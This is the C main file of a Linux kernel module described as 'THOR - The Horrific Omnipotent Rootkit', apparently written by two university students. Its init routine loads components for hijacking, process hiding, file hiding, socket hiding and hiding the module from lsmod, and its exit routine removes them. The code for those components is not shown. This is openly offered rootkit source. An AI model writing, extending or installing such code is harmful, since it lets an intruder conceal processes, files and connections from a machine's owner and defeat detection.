#include <linux/init.h>
#include <linux/module.h>

#include "filehider.h"
#include "helper.h"
#include "hijack.h"
#include "logging.h"
#include "lsmodhider.h"
#include "procfile.h"
#include "pidhider.h"
#include "sockethider.h"

static void thor_cleanup(void)
{
    procfile_cleanup();
    pidhider_cleanup();
    filehider_cleanup();
    sockethider_cleanup();
    lsmodhider_cleanup();
    hijack_cleanup();
    LOG_INFO("cleanup done");
}

static int __init thor_init(void)
{
    if (hijack_init() < 0 ||
        procfile_init() < 0 ||
        pidhider_init() < 0 ||
        filehider_init() < 0 ||
        lsmodhider_init() < 0 ||
        sockethider_init() < 0) {
        LOG_ERROR("failed to initialize");
        thor_cleanup();
        return -1;
    }

    LOG_INFO("init done");
    return 0;
}

static void __exit thor_exit(void)
{
    thor_cleanup();
}

module_init(thor_init);
module_exit(thor_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Alex Hirsch (W4RH4WK) <alexander.hirsch@student.uibk.ac.at>");
MODULE_AUTHOR("Franz-Josef Anton Friedrich Haider (krnylng) <Franz-Josef.Haider@student.uibk.ac.at>");
MODULE_DESCRIPTION("THOR - The Horrific Omnipotent Rootkit");
